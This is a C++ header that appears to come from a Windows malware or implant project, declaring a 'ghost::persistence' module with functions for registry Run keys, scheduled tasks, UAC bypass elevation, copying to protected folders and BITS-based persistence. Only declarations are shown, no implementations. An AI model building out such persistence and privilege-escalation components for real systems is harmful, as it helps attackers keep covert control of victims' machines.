#pragma once

#include <windows.h>
#include <string>

namespace ghost {
namespace persistence {

bool InstallAllMechanisms();

bool InstallRegistryRunKey();

bool CreateScheduledTask();

bool UacBypassElevation();

bool DuplicateToProtectedFolders();

bool InstallBitsadminMirror();

} // namespace persistence
} // namespace ghost